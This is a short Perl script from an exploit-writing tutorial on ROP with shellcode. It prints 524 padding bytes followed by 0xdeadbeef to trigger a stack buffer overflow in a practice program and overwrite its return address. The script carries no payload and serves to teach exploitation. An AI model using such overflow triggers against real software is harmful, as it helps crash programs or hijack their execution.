#!/usr/bin/perl

#####################################################################
############ Date: September 18 2015
############ Author: Vincent Dary
############ File: trigger_bof.pl
############
############ Architecture: Intel x86
############ Plateform: GNU/Linux 32 bits
############
############ Description: 
############ Exploit Writing Tutorial: ROP with Shellcode.
############ Trigger a stack buffer based overflow 
############ for StackBasedOverflow.
#####################################################################

use strict;
use warnings;

my $padding_overflow = 524;
my $buffer = "";

my $deadbeef = "\xef\xbe\xad\xde";

$buffer  =  'A' x $padding_overflow;
$buffer .=  $deadbeef;

print $buffer;


